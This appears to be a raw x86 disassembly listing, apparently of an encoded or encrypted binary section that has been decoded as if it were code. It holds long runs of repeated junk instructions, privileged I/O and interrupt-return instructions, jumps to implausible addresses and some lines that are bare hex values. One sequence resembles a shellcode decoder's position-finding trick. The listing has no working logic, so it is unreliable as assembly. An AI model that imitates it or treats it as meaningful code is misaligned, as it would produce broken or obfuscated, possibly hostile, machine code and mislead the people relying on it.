sbb al 0x1c
mov al 0xb5
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or cl ah
sbb al 0x1c
jae r-xdata
or cl ah
jecxz r-xdata
movsb [ edi ] [ esi ]
mov al [ 0xffffffffec2366f3 ]
sbb eax 0x68e3e3eb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx + ebp ]
sbb al 0x1c
sbb ecx [ edx ]
jae r-xdata
test [ eax ] bh
sbb al 0xb3
jae r-xdata
jae r-xdata
aas
sbb al 0x96
jae r-xdata
mov esi 0x731c1c5f
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
mov [ bp + di - 0x1f ] 0xab0ae3e3
adc ebx [ esp + ebx ]
mov cl [ edx ]
je r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
lea eax [ ebp - 0x44f65996 ]
mov [ edi + 0xfa66a85 ] edx
mov ebx 0x760a8a89
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btr [ edx + ebp * 2 + 0x120b0fbe ] esi
adc [ esp + ebx ] ebx
pushad
daa
out dx eax
and bp sp
out 0x29 eax
sbb al 0x1c
push 0x6ab3b3a5
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
in eax dx
jmp 0x68fd37b9
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x68
mov dh 0xef
sbb ecx [ ebx - 0x1c1c1d19 ]
or bl [ edi + edi + 0x73731c1c ]
jae r-xdata
jae r-xdata
mov [ ebp + 0x9a66a85 ] ecx
mov ebx 0x6a859789
jae r-xdata
loop r-xdata
jae r-xdata
xchg ecx eax
pop ebx
and al 0xa6
in al dx
mov [ 0x1c24 ] al
jae r-xdata
sbb al 0x66
and ecx [ edx ]
0x731c1c02 0x8a89
sbb al 0x1c
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
adc ecx [ edx ]
or [ esp + ebx ] ah
or [ bp + di ] esi
sbb al 0x1c
mov bl 0xa
add dh [ ebx ]
sbb al 0x1c
jae r-xdata
push 0x2366f3a0
in al dx
mov ebp 0x89202ab8
mov al [ ebp - 0x44f25996 ]
mov ebx eax
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
pushad
lahf
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btc [ ecx + 0x3a760a8a ] ecx
cmpsb [ esi ] [ edi ]
jmp r-xdata
sbb al 0x97
jae r-xdata
and ebp esp
mov ebx esp
mov bl 0xa
fnstenv [ ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov esp 0x2366b8bd
in al dx
xchg ebp eax
sub bl [ esp + ebx ]
xchg ecx eax
xchg ebp eax
retn
and bp sp
sbb al 0x73
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
and al 0x1c
imul esp
jmp r-xdata
jae r-xdata
mov dh 0xe9
jae r-xdata
jae r-xdata
mul edx
jae r-xdata
jae r-xdata
jecxz r-xdata
adc edi [ ebx - 0x6ff53977 ]
jecxz r-xdata
sub ah [ eax ]
jae r-xdata
aas
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov dh 0xf3
outsb
nop [ esp + ebx ] bx
or edi ecx
or [ esp + ebx ] ebx
push 0xf10befb6
shl [ ebx ] 0x1
jae r-xdata
mov dh 0x68
jae r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
mov edx 0x6a858d89
scasb [ edi ]
or eax 0x1c0d2c0a
sbb al 0x68
cmp ecx [ ebx - 0x69ef9a79 ]
mov ah 0x6a
mov ebp 0xa8d0bab
sbb al 0x1c
std
punpcklbw mmx0 [ edi ]
sbb esp [ edx + 0xf ]
adc edi [ ebx - 0x33f56c77 ]
test [ edx - 0x5a ] ebp
jae r-xdata
or [ ebx + 0x6a859789 ] edi
cmpsb [ esi ] [ edi ]
or edi [ ecx ]
and bl [ esp + ebx ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
popad
and [ ebx ] ah
shl [ ebx ] 0x1
mov esp 0x7373202a
push 0xe21c601a
in al dx
or ax 0x1c1c
ficomp [ esi - 0x21991309 ]
or [ esp + ebx ] ebx
or ch [ edi + 0x731c1c16 ]
jae r-xdata
jae r-xdata
or edi [ edi + 0x601c1c2f ]
daa
out dx eax
mov ebp ebx
loope r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
in al dx
jne r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
adc [ ebx + 0x740a8a89 ] edi
pop ss
push 0xffffffa6
jae r-xdata
mov [ edx + 0xda66a85 ] ecx
mov ebx 0x6a85c389
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
push ss
outsb
jae r-xdata
jae r-xdata
mov [ 0x1c01360a ] eax
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
pop ds
and eax 0xab41c1c
adc [ edx ] dh
sbb al 0x1c
in al dx
and [ edx ] cl
xchg esi eax
sbb al 0x1c
jae r-xdata
jae r-xdata
insd
push ds
sbb al 0x1c
or dl [ esi + 0x731c1c33 ]
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or ah [ ecx + 0x731c1c0b ]
jecxz r-xdata
outsb
scasb [ edi ]
cmp ebp [ esi - 0x5a ]
dec ebx
or edi [ edx + 0xae3e3e1 ]
jo r-xdata
das
mov ebx [ edx - 0x59db796d ]
xor edx [ ecx + 0xbc3c395 ]
mov ecx fs
cmpsb [ esi ] [ edi ]
sub edx [ ebx + 0x24c38f91 ]
cmpsb [ esi ] [ edi ]
jae r-xdata
mov bh 0xb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ edx + edx + 0x73731c1c ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jne r-xdata
outsb
jecxz r-xdata
mov esp 0x202ab8bd
cmpsb [ esi ] [ edi ]
push 0xffffff9e
or eax 0x6a853568
mov dh 0xd9
push 0x9e6a851b
adc ebp [ eax + 0x33 ]
test [ edx - 0x4a ] ebp
fild [ eax + 0x1a ]
push 0x9e6a8532
adc [ ebp + 0x68ddb66a ] eax
sbb ebp [ eax + 0x33 ]
test [ edx - 0x42 ] ebp
add [ edx ] ecx
pop es
pop ebp
sbb al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
or ah [ edx ]
out dx al
jecxz r-xdata
cmp [ edx ] esp
sbb al 0x1c
loop r-xdata
jae r-xdata
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffbe
pop ds
mov esi 0xe7b51c1f
jae r-xdata
sti
jecxz r-xdata
jne r-xdata
jae r-xdata
and eax 0x1c1e6d0b
sbb al 0xa
xchg esi eax
xor ebx [ esp + ebx ]
jae r-xdata
or cl [ edi + ebp + 0x1c ]
sbb al 0x73
mov ebx 0xcc0a9389
sbb al 0x1c
or dh [ esi + 0x3a ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb0
movsb [ edi ] [ esi ]
sbb al 0x75
dec edi
jecxz r-xdata
or bh [ ebp - 0x7ae3e3d3 ]
jae r-xdata
mov edx 0x67ec2366
jmp 0xffffffffd12a3b3e
jae r-xdata
in al dx
sbb eax 0x8561ecc3
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or dl ch
adc [ esp + ebx ] bl
adc bl [ esp + ebx ]
jae r-xdata
jae r-xdata
mov esi eax
or dl [ eax + 0x73e3e3e3 ]
sbb al 0x73
mov [ edx + 0x11a66a85 ] ecx
mov ebx 0x1c3f160a
jmp r-xdata
jbe r-xdata
sbb al 0xec
jae r-xdata
or eax 0x85c389bb
push 0xffffffa6
cmpsb [ esi ] [ edi ]
mov [ ecx - 0x59957a45 ] eax
sbb ecx [ ecx + 0x6a85bb90 ]
cmp bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or al [ edi - 0x13e3e3c9 ]
outsb
mov ah 0xb0
or cl [ edx + edx + 0x73731c1c ]
sbb al 0xa
daa
out 0xe3 eax
sub al 0x1c
sbb al 0x1c
jae r-xdata
sbb al 0xb5
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
sbb al 0x96
outsb
cmpsb [ esi ] [ edi ]
aas
mov bl 0x68
and eax 0x1c58070b
sbb al 0xba
and bp sp
jae r-xdata
jae r-xdata
mov dl 0xa
aad 0x10
sbb al 0x1c
jecxz r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0x1c
sub eax 0x6a851c1c
mov esi 0xb88e891d
jae r-xdata
jmp 0xffffffffd12a3b3e
and ebp esp
jae r-xdata
jecxz r-xdata
sar [ ebx + 0x2b689b89 ] 0x85
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
or dl [ esi ]
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jae r-xdata
and al 0x1c
sbb ax 0xe3eb
or ah [ ecx ]
mov [ edx + ebp * 2 ] ebx
sahf
sbb ebx [ esi * 2 - 0x1c1c1c91 ]
and cx [ edx ]
mov ecx 0x731c1c08
jae r-xdata
mov ebp edi
jecxz r-xdata
ja r-xdata
push 0x1b07600f
bound ecx [ edi ]
jae r-xdata
jae r-xdata
daa
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
iretd
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xffffffbe
sbb eax 0xab88e89
push es
sbb al 0x85
jae r-xdata
sub ah [ eax ]
sbb al 0x1c
mov esp 0x737320bd
jae r-xdata
insb
sub ebx [ esp + ebx ]
mov [ ebx + 0x6a852b68 ] ebx
scasb [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
aas
mov ebx 0x1c0ba10a
cmpsb [ esi ] [ edi ]
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffa6
jae r-xdata
pushad
daa
out dx eax
fidivr [ edi + 0x67ecf7c7 ]
jmp r-xdata
jae r-xdata
jae r-xdata
popad
sbb al 0x1c
dec ebx
mov ch 0xa
pop esp
sub [ esp + ebx ] ebx
test [ edx - 0x52 ] ebp
jae r-xdata
sahf
sbb ebx [ esi * 4 + 0x603b68db ]
sbb [ esp + ebp * 8 ] bl
jecxz r-xdata
push 0xa66a8525
jae r-xdata
push 0xbc0aeba6
push 0xae6a852b
jae r-xdata
mov ebx 0x2b689b89
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
pushad
sbb eax 0xab681c1c
jmp r-xdata
fsubr st6
test [ edx - 0x5a ] ebp
test [ edx - 0x52 ] ebp
jae r-xdata
fwait
jae r-xdata
and eax 0xc1a66a85
jae r-xdata
pushad
jae r-xdata
or [ si ] bl
sbb al 0x1c
pushad
sahf
pop ds
out 0xec eax
outsd
add bl [ esp + ebx ]
sbb al 0xa
xlat
or al 0x1c
sbb al 0xa
jno r-xdata
cmp esp [ eax + 0x18 ]
sbb al 0xec
pushad
sbb dl cl
in al dx
sub al 0x1d
sbb al 0x1c
push 0x2468ebab
or esi [ edi + 0xa1c1c25 ]
mov ch 0x4
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
loop r-xdata
sub eax [ ebp - 0x45385196 ]
mov [ ecx + 0x6a853a68 ] edx
mov esi 0x853b68c5
push 0xffffffbe
jae r-xdata
mov bl 0xec
jae r-xdata
jae r-xdata
push 0x9f681fae
outsb
or edx eax
adc eax 0x3c682d68
xor [ eax ] bl
pushad
and eax 0x110aa1eb
test [ edx - 0x5a ] ebp
pop es
mov ebx 0x6a858689
cmpsb [ esi ] [ edi ]
add eax 0xa8d89bb
in eax dx
add ebx [ esp + ebx ]
jae r-xdata
sbb al 0x73
jecxz r-xdata
push 0xffffffae
mov edx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
cmp ebp [ edx ]
jae r-xdata
and [ esp + ebx ] bl
jae r-xdata
mov eax 0x1c06670a
or ah [ edi + 0x6 ]
jmp r-xdata
arpl [ esi + edx * 4 ] bx
jae r-xdata
jae r-xdata
add ebx 0xc117a624
jae r-xdata
and [ ebx + 0x73 ] dh
mov esi eax
test [ edx - 0x5a ] ebp
btc [ edx ] ecx
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x1c
jae r-xdata
pop ss
rol esi 0x8f
jae r-xdata
retn
jae r-xdata
iretd
mov [ ebp - 0x44f05996 ] 0xa
jae r-xdata
mov ah 0xaf
jae r-xdata
jae r-xdata

push 0xbe6a853a
lds ebp [ eax + 0x3b ]
test [ edx - 0x42 ] ebp
and bp sp
sbb al 0xb4
scasd [ edi ]
jae r-xdata
nop
and al 0xa6
jae r-xdata
0x1c13
in al dx
jae r-xdata
sbb eax ecx
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
and [ ebp - 0x44025996 ] eax
mov ebp ecx
mov ebp 0x6a858689
rol ebx 0xc1
jae r-xdata
rol esi 0xa
movsd [ edi ] [ esi ]
sub [ esp + ebx ] bl
jae r-xdata
imul esi edx 0xec1368b5
push ebp
in eax 0xb4
in al dx
push ebp
sbb eax ecx
and al 0xa
add edi [ edx ]
xor eax [ ebp - 0x46c64996 ]
mov [ ebx + 0x3fb66a85 ] edx
jae r-xdata
jae r-xdata
jae r-xdata
mov edx 0xece11b60
jae r-xdata
mov ecx 0x6a858f89
mov dh 0x3d
mov ecx 0x6a858689
mov dh 0x3
or dl [ eax ]
push ss
sbb al 0x1c
jae r-xdata
push 0xffffffb6
mov bl 0x68
cmpsb [ esi ] [ edi ]
jmp r-xdata
push 0xffffffb6
aas
arpl [ esi ] bx
fsubr [ esi - 0x249e1311 ]
add [ esp + ebx ] ebx
mov ebp 0x1c29ec0a
sbb al 0x73
jae r-xdata
push esi
sbb al 0x1c
jae r-xdata
sbb al 0x1c
ja r-xdata
sbb esp ecx
jae r-xdata
sbb al 0x1c
or ebx [ edx - 0x5991e3e4 ]
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
in al 0xe3
jecxz r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
sbb al 0x1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
mov edi 0xe21f9e60
in al dx
mov al 0x38
sbb al 0x1c
push 0xdf8bd7a5
jmp 0xffffffffa6b11577
fisub [ esi + 0x5bd50a1b ]
sbb al 0xd5
sbb al 0x74
pop ss
jecxz r-xdata
jecxz r-xdata
jae r-xdata
ja r-xdata
jae r-xdata
push edx
fsubr [ edx + ecx ]
outsb
mov [ esi ] ebp
sbb al 0x1c
jae r-xdata
test eax ebx
sub al 0xa
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov bh 0xb
jae r-xdata
sbb al 0x73
jae r-xdata
sbb eax 0x279e6a85
jae r-xdata
ficomp [ edi + 0x67ecd3c7 ]
out 0xe3 al
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x73202abc ] eax
jae r-xdata
jae r-xdata
xchg edi eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
adc [ edi ] ecx
sbb al 0x1c
jae r-xdata
rcr [ edx + ecx ] 0x1
push 0xffffffa5
mov ecx [ ebx ]
mov bl 0x3c
sbb al 0x1c
mov esi [ ebx ]
jno r-xdata
cdq
jae r-xdata
push [ ecx ]
pop edi
push 0xffffffb4
push 0xffffffa5
or [ ebx ] 0xffffff8f
cmp al 0x1c
sbb al 0x8b
lahf
mov dl 0x84
mov [ edx + ebp * 2 - 0x42f4785b ] esi
cmp al 0x1c
sbb al 0x8b
or ebx [ ecx - 0x74e3e3c4 ]
jae r-xdata
or eax eax
cmp al 0x1c
sbb al 0x8b
add ah cl
and al 0x52
or esi [ ebp + 0x3c ]
sbb al 0x1c
mov edi [ ecx - 0x4bf143f4 ]
push 0xffffffa5
or dl ah
stosb [ edi ]
mov ebp 0x8b1c1c3c
jae r-xdata
mov al 0xa
into
or esp esi
or [ esp + ebx ] ebx
push 0xffffff9f
in al dx
push esp
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
loope r-xdata
jae r-xdata
or edx edi
cmp al 0x1c
sbb al 0x60
daa
mov [ 0xfffffffff853468b ] eax

mov ah 0x6a
movsd [ edi ] [ esi ]
loop r-xdata
cmp al 0x1c
sbb al 0x8b
mov edx esp
mov ebx esp
sbb al 0x97
sar [ esp + ebx ] 0x1c
mov eax [ edx ]
loope r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jmp 0xffffffffe3db145e
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fwait
or esi esi
cmp al 0x1c
push edx
imul esp ebx 0xffffffe3
out 0x3c eax
and eax 0x6a851d68
sahf
push 0x9e6a851b
ja r-xdata
mov ecx [ eax ]
jae r-xdata
mov ecx 0x85e3e394
fsubr [ esp + ebp * 8 ]
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
punpckldq mmx1 [ edi ]
mov bl 0xe1
jecxz r-xdata
fcom [ eax ]
in al dx
int 0x2
sbb al 0x1c
push 0x2ceb0a34
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
push 0x731c1c3c
or edx [ edi + 0x22 ]
sbb al 0x1c
dec esi
mov bl 0xa
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0x8b
fcmovnbe st4
fst [ edi ]
mov ah 0x6a
jcxz r-xdata
jecxz r-xdata
jae r-xdata
adc [ 0xffffffffdb8b1c1c ] bh
loop r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0xb0
or cl dh
lahf
jae r-xdata
cmp [ ecx + 0x6a859389 ] edi
mov ah 0x89
nop
sbb al 0x6a
jae r-xdata
jae r-xdata
and eax 0x73731c1c
or dl [ esi + 0x731c1c2d ]
test [ edx - 0x4a ] ebp
cmp [ ecx + 0x1c5a9c0a ] 0x1c
jae r-xdata
sbb al 0x1c
jecxz r-xdata
push 0x65
jae r-xdata
or ch [ eax + 0x3c ]
sbb al 0x1c
jae r-xdata
sahf
sbb al 0x1c
pop esp
lodsd [ esi ]
test eax ebx
sub al 0xec
jae r-xdata
adc eax 0x66ec1c1c
sbb [ edx ] ah
jae r-xdata
lahf
jae r-xdata
sbb al 0x1c
or ah [ edi + 0xa1c1c20 ]
or bl [ eax + 0x1c ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
in al dx
sbb [ edx ] ah
sbb al 0xb3
xchg eax edx
sub ah [ eax + 0x1b ]
sbb al 0xec
out 0xe2 eax
jecxz r-xdata
lahf
mov [ ebp + 0x6a851b68 ] esi
sahf
push 0xffffff9e
and [ eax + 0x1d ] ebp
test [ edx - 0x62 ] ebp
daa
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6b656ab4
or eax [ ecx ]
cmp eax 0x48b1c1c
in al 0x63
push ss
sbb al 0x1c
push edi
and bl [ esp + ebx ]
jae r-xdata
psllq mmx1 [ ecx + 0x480abb82 ]
xor [ esp + ebx ] bl
pushad
fcomip st2
jecxz r-xdata
mov edx 0x22688289
test [ edx - 0x5a ] ebp
cmp edi [ ebx + 0x33688e89 ]
test [ edx - 0x4a ] ebp
jbe r-xdata
mov bl 0x87
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
pushad
jae r-xdata
mov dh 0x3f
mov dh 0x39
mov ecx 0x6a859389
or al dh
or bl [ esp + ebx ]
jae r-xdata
push 0x3bdf0a1d
outsb
push bx
push ds
sbb al 0x1c
or dl [ ecx + 0x731c1c1d ]
jae r-xdata
push ds
leave
jno r-xdata
sbb al 0x1c
jecxz r-xdata
btr [ edx ] ecx
jae r-xdata
push 0xb30f620f
loope r-xdata
mov bl 0xb
pop ebx
and eax 0xab51c1c
mov bl 0xb
imul edi [ esp + ebx ] 0x1c
mov ah 0x6a
jae r-xdata
mov ebx ebx
or esi [ edx ]
cmp eax 0xf88b1c1c
aaa
mov bl 0x81
mov ah 0x6a
inc edi
jecxz r-xdata
iretd
jae r-xdata
jecxz r-xdata
sub edx eax
sbb al 0xa
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
mov ah 0x6a
ja r-xdata
sbb al 0x8b
add al 0xe4
arpl [ esi ] dx
jecxz r-xdata
jae r-xdata
sbb al 0x90
jae r-xdata
pop es
mov bl 0x6e
cmpsb [ esi ] [ edi ]
imul esi [ ebx - 0x18764f50 ] 0xa
and [ eax ] esp
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
[ edx + 0x30480abb ] eax
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
mov [ eax + 0x688289ba ] edx
and al [ ebp - 0x44c45996 ]
mov [ esi + 0x6a853368 ] ecx
mov ebp [ esi - 0x4b4e030f ]
or ebp [ ebx + 0x3c ]
sbb al 0x1c
jae r-xdata
lodsd [ esi ]
aaa
sbb al 0x1c
jae r-xdata
and edi [ 0xfffffffffd8b1c1c ]
shr [ eax + 0x1d ] cl
or bl bh
cmp ebx [ esp + ebx ]
jae r-xdata
push 0xffffffa5
cmp al 0x1c
sbb al 0x8b
scasb [ edi ]
int1
cld
mov cl 0xb4
jae r-xdata
mov esi 0x8538d0f3
push 0xffffffbe
push 0xe389eba6
mov edi esp
jecxz r-xdata
add al 0x25
sbb al 0x1c
jae r-xdata
sbb eax 0x1c3bdf0a
sbb al 0x73
mov ch 0xb3
or ebx [ ebx + 0x25 ]
jae r-xdata
sbb al 0x1c
mov ch 0xa
sbb al 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
aad 0x5b
sbb al 0x66
jae r-xdata
0x54ed
jecxz r-xdata
sbb al 0x1c
fistp [ ebx ]
mov ebx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
or bh [ eax + ebx + 0x73731c1c ]
test [ edx - 0x4a ] ebp
pop ecx
mov ecx 0x1c34790a
sbb al 0x73
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
inc ebx
jecxz r-xdata
or al [ esi + 0x18 ]
sbb al 0x1c
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ss
inc esi
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x54
mov bl 0x89
sbb al 0x1c
loopne r-xdata
and [ ebx + 0x73 ] dh
jecxz r-xdata
mov ebp ebx
mov ebp [ edx - 0x40 ]
or bl dh
and eax 0x5fbe6a85
and [ esp + ebx ] ebx
jae r-xdata
push 0xffffffae
das
or ecx ecx
push esi
sbb al 0x1c
mov edx 0x66ec2366
cmc
pop esp
sbb al 0x1c
jae r-xdata
arpl [ eax + 0x3dfb0ab3 ] si
cmpsd [ esi ] [ edi ]
push 0xffffffa6
jae r-xdata
punpcklbw mmx1 [ edi ]
dec [ ecx - 0x6b764479 ]
fst [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
xchg esi eax
punpckhdq mm7 [ esi + 0x210d0a17 ]
sbb al 0x1c
jae r-xdata
jmp r-xdata
outsb
jecxz r-xdata
mov bl 0xb4
sbb al 0x75
xchg esi eax
out dx eax
or ecx [ edx + 0x3b ]
sbb al 0x1c
mov al [ 0x6ae789f7 ]
jae r-xdata
movsd [ edi ] [ esi ]
push 0xf6a0a39
sbb al 0x1c
push 0xffffffbe
inc esp
cmp eax 0x19601c1c
enter 0x7a0a 0x3d
sbb al 0x1c
jae r-xdata
jae r-xdata
lea ebp [ eax + 0x2b ]
test [ edx - 0x52 ] ebp
adc edi [ edx + 0x6a859789 ]
scasb [ edi ]
adc [ edx + 0x6a85cd89 ] edi
pop ds
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov dh 0x68
sub bl [ esp + ebx ]
jae r-xdata
sbb al 0x75
dec edi
jecxz r-xdata
test [ eax ] ah
sbb al 0x1c
pushad
daa
test [ ebx - 0x1c1c1de9 ] 0x1cebb41c
xchg edi eax
test [ edx - 0x4a ] ebp
and eax [ ebp - 0x7ad66196 ]
push 0xffffffbe
pop ss
or cl [ 0x731c1c21 ]
push 0xbe6a8525
pop edi
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
and bp sp
ja r-xdata
sbb al 0x60
jecxz r-xdata
daa
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c506d0a ] eax
mov edi esp
jae r-xdata
jae r-xdata
mov [ edi - 0x2fe05996 ] esp
cmp [ esi - 0x5a ] ch
push esp
movsd [ edi ] [ esi ]
imul [ esi - 0x59 ]
sar ebx cl
jae r-xdata
or ah [ ebp + 0x1f ]
sbb al 0x1c
jae r-xdata
and ebp esp
sub [ bx + di ] ah
sbb al 0x1c
outsb
sar [ eax ] 0x1
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xeb
sbb al 0x97
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa7
jae r-xdata
inc esi
jae r-xdata
fsub [ eax ]
in al dx
outsd
and eax 0x2b681c1c
or dh dl
pop esi
sbb al 0x1c
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ ebp + 0x50 ]
sbb al 0x1c
sbb al 0xb5
loopne r-xdata
sbb al 0x73
jae r-xdata
mov [ 0x60e3e3e0 ] eax
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and ah ch
movaps xmm3 [ si ]
sbb al 0x68
sub ecx [ edx ]
inc esi
sbb [ esp + ebx ] bl
fisub [ edi + 0x61ecfbc7 ]
rcl [ eax ] 0x1
sbb al 0x1c
in al dx
push esp
sub bl [ cs : esp + ebx ]
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
sub ah [ eax ]
jae r-xdata
sbb al 0x1c
in al dx
pop ss
or ah [ edx ]
adc ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
add eax 0x73731c1c
jae r-xdata
pop ss
mov bl 0x89
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop es
push 0x54c30b24
mov ebx esp
sbb al 0x74
dec edi
jecxz r-xdata
push esp
pushad
sbb al 0x1c
jae r-xdata
sbb al 0xda
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
mov ch 0xb3
mov ah 0x1c
and esp [ ebx + 0x1c506d0a ]
and esi [ ebx + 0x751ce389 ]
arpl bx sp
jecxz r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
out 0x6a eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp ebx
jae r-xdata
scasb [ edi ]
int1
push 0xbe6a853c
cmpsd [ esi ] [ edi ]
mov [ ecx - 0x41957a48 ] edx
push 0x3eb50a0f
sbb al 0x1c
test [ edx - 0x42 ] ebp
in eax dx
push 0xbe6a853b
sar [ eax ] 0x1
test [ edx - 0x42 ] ebp
mov bl 0xa
jae r-xdata
sbb esp edx
or dl [ edi ]
jne r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
mov ah 0x6a
daa
jae r-xdata
push esp
daa
sti
and cx [ edx ]
arpl [ ebp + 0x1c ] bx
dec edi
push 0xec1c661b
scasb [ edi ]
sub ebp [ esi - 0x5a ]
dec ebx
or ecx [ ebp + 0x18 ]
sbb al 0x1c
and bp sp
pop ebx
and [ esp + ebx ] ebx
outsb
scasb [ edi ]
pop ebx
outsb
cmpsb [ esi ] [ edi ]
dec ebx
or edi [ eax + 0x18 ]
sbb al 0x1c
and bp sp
sbb al 0x6e
rol [ ebp - 0x44f45996 ] 0x1
or ch al
xor eax 0x73731c1c
jae r-xdata
jae r-xdata
pushad
shl ebx cl
sti
cmp eax 0x73731c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
sbb al 0xec
and [ ebx + 0x73 ] dh
jae r-xdata
fdivr [ esp + ebx ]
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
mov edx 0xaa323d0
push es
jecxz r-xdata
cmp al 0x1c
sbb al 0x68
sbb esp eax
sbb [ edx ] cl
jg r-xdata
inc [ ebp + 0x67ec2366 ]
movsb [ edi ] [ esi ]
jae r-xdata
mov bl 0x1c
jne r-xdata
jecxz r-xdata
pushad

jae r-xdata
